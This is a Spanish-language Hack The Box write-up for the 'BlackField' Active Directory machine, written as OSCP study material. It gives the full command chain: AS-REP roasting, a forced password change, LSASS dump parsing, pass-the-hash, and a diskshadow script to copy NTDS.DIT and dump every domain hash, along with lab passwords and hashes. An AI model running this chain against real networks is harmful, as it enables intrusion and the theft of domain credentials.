[⚫ BlackField — HTB [Windows · Hard · AD] 36c15bd2d16c81efb92fe73ca4a07d6f.md](https://github.com/user-attachments/files/28343053/BlackField.HTB.Windows.Hard.AD.36c15bd2d16c81efb92fe73ca4a07d6f.md)
# ⚫ BlackField — HTB [Windows · Hard · AD]

| Campo | Detalle |
| --- | --- |
| IP | `10.129.229.17` |
| Dominio | `BLACKFIELD.local` |
| Vector inicial | SMB anónimo → profiles$ → lista usuarios → ASREPRoast |
| Usuario inicial | `support` : `#00^BlackKnight` |
| Pivote | `audit2020` : `OSCP.Pwned.2026.!!!` (ForceChangePassword) |
| Pivote 2 | `svc_backup` (hash NTLM del lsass dump) |
| Escalada | SeBackupPrivilege → diskshadow Shadow Copy → robocopy NTDS.DIT |
| Root | Administrator vía impacket-secretsdump + evil-winrm PtH |
| Metasploit | ❌ No usado |

---

# 1. Reconocimiento

## Nmap — puertos

Stack minimal: DNS, RPC, LDAP, SMB. Sin WinRM en el primer scan — se confirma más adelante. Dominio: `BLACKFIELD.local`, hostname DC01.

```bash
nmap -sS -p- --min-rate 5000 10.129.229.17
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/BlackField/assets/image.png)
> 

## Nmap — versiones

Dominio `BLACKFIELD.local`, hostname DC01, Windows Server 2019. SMB signing enabled and required. Clock skew ~7h — sincronizar antes de ataques Kerberos.

```bash
nmap -sVC 10.129.229.17 -p53,135,389,445 -oN targeted
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/BlackField/assets/image1.png)
> 

---

# 2. Enumeración — SMB anónimo

RPC, LDAP y nxc están capados para enumeración anónima. SMBclient sí responde:

```bash
smbclient -L //10.129.229.17 -N
nxc smb 10.129.229.17 -u 'Anonymous' -p '' --shares
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/BlackField/assets/image2.png)
> 

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/BlackField/assets/image3.png)
> 

Dos shares accesibles: `profiles$` y `SYSVOL`. El nombre `profiles$` sugiere directorios de perfil de usuario — fuente potencial de nombres de usuario válidos.

```bash
smbclient //10.129.229.17/profiles$ -N
smb: \> ls
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/BlackField/assets/image4.png)
> 

Extraemos todos los nombres a `users.txt` y los validamos contra Kerberos:

```bash
nxc smb 10.129.229.17 -u users.txt -p '' --continue-on-success
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/BlackField/assets/image5.png)
> 

---

# 3. Explotación — ASREPRoasting

Con la lista de usuarios probamos ASREPRoast:

```bash
impacket-GetNPUsers blackfield.local/ -usersfile users.txt \
  -dc-ip 10.129.229.17 -request -outputfile asrep_hashes.txt
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/BlackField/assets/image6.png)
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/BlackField/assets/image7.png)
> 

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
john --format=krb5asrep --show asrep_hashes.txt
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/BlackField/assets/image8.png)
> 

---

# 4. Enumeración con credenciales — BloodHound

Con `support:#00^BlackKnight` intentamos RPC, SMB, LDAP — rabbit holes por todos lados. Pasamos a BloodHound para mapear el AD correctamente:

```bash
# Añadir al /etc/hosts:
# 10.129.229.17 dc01.blackfield.local blackfield.local

bloodhound-python -c ALL -u support -p '#00^BlackKnight' \
  -d blackfield.local -dc dc01.blackfield.local \
  -ns 10.129.229.17 --zip
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/BlackField/assets/image9.png)
> 

Cargamos el zip en BloodHound y buscamos qué puede hacer `support`:

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/BlackField/assets/image10.png)
> 

`support` tiene `ForceChangePassword` sobre `audit2020` — puede cambiarle la contraseña sin conocerla.

---

# 5. ForceChangePassword → audit2020

```bash
nxc smb 10.129.229.17 -u 'support' -p '#00^BlackKnight' \
  -M change-password -o USER='audit2020' NEWPASS='OSCP.Pwned.2026.!!!'
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/BlackField/assets/image11.png)
> 

Verificamos qué tiene audit2020:

```bash
nxc winrm 10.129.229.17 -u 'audit2020' -p 'OSCP.Pwned.2026.!!!'  # no WinRM
nxc smb 10.129.229.17 -u 'audit2020' -p 'OSCP.Pwned.2026.!!!' --shares

```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/BlackField/assets/image12.png)
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/BlackField/assets/image13.png)
> 

audit2020 tiene acceso de lectura a `forensic` — el share de auditoría que antes estaba denegado.

---

# 6. SMB forensic — lsass dump

```bash
smbclient //10.129.229.17/forensic -U 'audit2020%OSCP.Pwned.2026.!!!'
smb: \> ls
smb: \> cd memory_analysis\
smb: \memory_analysis\> ls
smb: \memory_analysis\> get lsass.zip
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/BlackField/assets/image14.png)
> 

`lsass.zip` es el dump del proceso LSASS — contiene credenciales en memoria de todos los usuarios que habían iniciado sesión. Lo extraemos y procesamos con pypykatz:

```bash
unzip lsass.zip
pypykatz lsa minidump lsass.DMP
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/BlackField/assets/image15.png)
> 

---

# 7. Pass-the-Hash con svc_backup

```bash
nxc winrm 10.129.229.17 -u 'svc_backup' \
  -H '9658d1d1dcd9250115e2205d9f48400d'
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/BlackField/assets/image16.png)
> 

```bash
evil-winrm -i 10.129.229.17 -u svc_backup \
  -H 9658d1d1dcd9250115e2205d9f48400d
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/BlackField/assets/image17.png)
> 

---

# 8. Escalada — SeBackupPrivilege → NTDS.DIT

## Verificar privilegios

```powershell
whoami /priv
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/BlackField/assets/image18.png)
> 

SeBackupPrivilege permite leer cualquier archivo del sistema independientemente de los permisos NTFS, incluyendo `NTDS.DIT` — la base de datos del AD con todos los hashes.

## Problema: NTDS.DIT está bloqueado por el AD

Intento directo con robocopy falla porque el AD tiene el archivo en uso constantemente:

```powershell
robocopy /B C:\Windows\NTDS\ C:\programdata\ ntds.dit
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/BlackField/assets/image19.png)
> 

## Solución: diskshadow — Shadow Copy del disco

Diskshadow crea una instantánea (VSS) del disco C:. En esa copia el NTDS.DIT no está en uso por ningún proceso y se puede copiar libremente.

Creamos el script `vss.dsh` en Kali:

```
set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on
add volume c: alias df
create
expose %df% z:
```

Convertimos a formato DOS (CRLF) para que Windows lo interprete correctamente:

```bash
unix2dos vss.dsh
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/BlackField/assets/image20.png)
> 

Subimos el script a `C:\programdata` y ejecutamos diskshadow:

```powershell
*Evil-WinRM* PS> upload vss.dsh
*Evil-WinRM* PS C:\programdata> diskshadow.exe /s vss.dsh
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/BlackField/assets/image21.png)
> 

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/BlackField/assets/image22.png)
> 

## Copiar NTDS.DIT desde la Shadow Copy

```powershell
robocopy /B Z:\Windows\NTDS\ C:\programdata\ ntds.dit
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/BlackField/assets/image23.png)
> 

## Volcar SYSTEM.HIVE

```powershell
reg.exe save hklm\system c:\programdata\system.hive
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/BlackField/assets/image24.png)
> 

## Descargar ambos archivos a Kali

```powershell
download ntds.dit
download system.hive
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/BlackField/assets/image25.png)
> 

## DCSync offline con impacket-secretsdump

```bash
impacket-secretsdump -system system.hive -ntds ntds.dit LOCAL \
  | grep -i "Administrator"
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/BlackField/assets/image26.png)
> 

## Pass-the-Hash → Administrator

```bash
evil-winrm -i 10.129.229.17 -u Administrator \
  -H 184fb5e5178480be64824d4cd53b99ee
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/BlackField/assets/image27.png)
> 

---

# 9. Cadena de ataque

```
SMB anónimo → profiles$ → ~300 nombres de usuario
    ↓
impacket-GetNPUsers ASREPRoast → support hash
    ↓
john → support:#00^BlackKnight
    ↓
bloodhound-python → support tiene ForceChangePassword sobre audit2020
    ↓
nxc change-password → audit2020:OSCP.Pwned.2026.!!!
    ↓
SMB forensic (READ) → memory_analysis/lsass.zip
    ↓
pypykatz → svc_backup NT: 9658d1d1dcd9250115e2205d9f48400d
    ↓
evil-winrm PtH svc_backup → user.txt
    ↓
SeBackupPrivilege + diskshadow (Shadow Copy Z:\) + robocopy /B
    → ntds.dit + system.hive
    ↓
impacket-secretsdump LOCAL → Administrator: 184fb5e5178480be64824d4cd53b99ee
    ↓
evil-winrm PtH Administrator → root.txt
```

---

# 10. Moralejas

## profiles$ vacío sigue siendo útil — los nombres son la enumeración

Los directorios en profiles$ tenían 0 bytes de contenido, pero los nombres de las carpetas eran los usernames del dominio. Con ~300 nombres y ASREPRoast tienes vector directo. La lógica es: si el share existe, los nombres existen. Siempre listar y guardar como users.txt.

## ForceChangePassword es un edge de BloodHound que se ejecuta en dos comandos

nxc tiene módulo `change-password` que lo hace directamente. Sin BloodHound este edge es invisible — no hay forma de encontrarlo manualmente en un dominio de 300+ usuarios. BloodHound antes de cualquier rabbit hole.

## lsass dump en un share de auditoría es una cagada enorme del blue team

El share `forensic` con un dump de LSASS accesible para audit2020 es un hallazgo crítico en un pentest real. LSASS contiene hashes de todas las sesiones activas. pypykatz (el equivalente de mimikatz para Linux) lo procesa en segundos.

## SeBackupPrivilege + diskshadow es el bypass estándar cuando NTDS.DIT está bloqueado

`Copy-Item` y `robocopy` directos fallan por el bloqueo del AD. El flujo correcto es siempre: diskshadow crea VSS → exposición como unidad virtual → robocopy /B desde la VSS. Memorizar el script vss.dsh — es reutilizable en cualquier máquina con SeBackupPrivilege.

## unix2dos antes de subir scripts a Windows

Windows usa CRLF (rn). Un script creado en Linux con LF (n) puede ser ignorado o mal interpretado por herramientas como diskshadow. `unix2dos` antes de subir cualquier script de texto a un objetivo Windows.

## El patrón OSCP de esta máquina

```
SMB anónimo → lista usuarios → ASREPRoast
    ↓
BloodHound → ACL abuse (ForceChangePassword)
    ↓
SMB con nuevas creds → lsass dump → pypykatz → PtH
    ↓
SeBackupPrivilege → diskshadow VSS → NTDS.DIT → secretsdump LOCAL → PtH Administrator
```

Cadena larga con 4 usuarios distintos — exactamente el tipo de AD set que puede aparecer en el OSCP.

---

# 11. Conceptos técnicos clave

**ForceChangePassword:** Edge de BloodHound que indica que una cuenta puede cambiar la contraseña de otra sin conocerla. Se ejecuta via RPC (samr) o con nxc `-M change-password`. No requiere conocer la contraseña actual del objetivo.

**pypykatz:** Implementación de mimikatz en Python para Linux. Procesa dumps de LSASS (minidump o raw) y extrae credenciales: hashes NT, passwords en claro si están en memoria, tickets Kerberos. `pypykatz lsa minidump lsass.DMP`.

**SeBackupPrivilege:** Privilegio de Windows que permite leer cualquier archivo del sistema ignorando los ACLs NTFS, como si fuera una operación de backup. La API de backup de Windows se activa con el flag `/B` en robocopy o con la flag `FILE_FLAG_BACKUP_SEMANTICS` en las llamadas al sistema.

**VSS (Volume Shadow Copy):** Mecanismo de Windows para crear instantáneas de discos en caliente. diskshadow puede crear una VSS del C: y exponerla como una unidad nueva (Z:). Los archivos en la VSS no están bloqueados por ningún proceso y pueden copiarse libremente, incluyendo NTDS.DIT.

**impacket-secretsdump LOCAL:** Cuando tienes NTDS.DIT + SYSTEM.HIVE en local, secretsdump puede extraer todos los hashes sin conectarse al DC. Equivale a un DCSync completo pero offline.

---

# 12. Comandos clave

```bash
# Reconocimiento
nmap -sS -p- --min-rate 5000 10.129.229.17
nmap -sVC 10.129.229.17 -p53,135,389,445 -oN targeted

# SMB anónimo
smbclient -L //10.129.229.17 -N
nxc smb 10.129.229.17 -u 'Anonymous' -p '' --shares
smbclient //10.129.229.17/profiles$ -N  # extraer nombres → users.txt

# Validar usuarios
nxc smb 10.129.229.17 -u users.txt -p '' --continue-on-success

# ASREPRoast
impacket-GetNPUsers blackfield.local/ -usersfile users.txt \
  -dc-ip 10.129.229.17 -request -outputfile asrep_hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt

# BloodHound
# /etc/hosts: 10.129.229.17 dc01.blackfield.local blackfield.local
bloodhound-python -c ALL -u support -p '#00^BlackKnight' \
  -d blackfield.local -dc dc01.blackfield.local -ns 10.129.229.17 --zip

# ForceChangePassword
nxc smb 10.129.229.17 -u 'support' -p '#00^BlackKnight' \
  -M change-password -o USER='audit2020' NEWPASS='OSCP.Pwned.2026.!!!'

# Acceso forensic con audit2020
nxc smb 10.129.229.17 -u 'audit2020' -p 'OSCP.Pwned.2026.!!!' --shares
smbclient //10.129.229.17/forensic -U 'audit2020%OSCP.Pwned.2026.!!!'
# cd memory_analysis \ get lsass.zip

# pypykatz
unzip lsass.zip
pypykatz lsa minidump lsass.DMP

# PtH svc_backup
nxc winrm 10.129.229.17 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
evil-winrm -i 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d

# SeBackupPrivilege → diskshadow
# vss.dsh (unix2dos antes de subir):
# set context persistent nowriters
# set metadata c:\programdata\df.cab
# set verbose on
# add volume c: alias df
# create
# expose %df% z:
unix2dos vss.dsh
# upload vss.dsh → C:\programdata\
diskshadow.exe /s vss.dsh

# Copiar NTDS.DIT desde Shadow Copy
robocopy /B Z:\Windows\NTDS\ C:\programdata\ ntds.dit
reg.exe save hklm\system c:\programdata\system.hive
# download ntds.dit
# download system.hive

# secretsdump offline
impacket-secretsdump -system system.hive -ntds ntds.dit LOCAL

# PtH Administrator
evil-winrm -i 10.129.229.17 -u Administrator \
  -H 184fb5e5178480be64824d4cd53b99ee
```
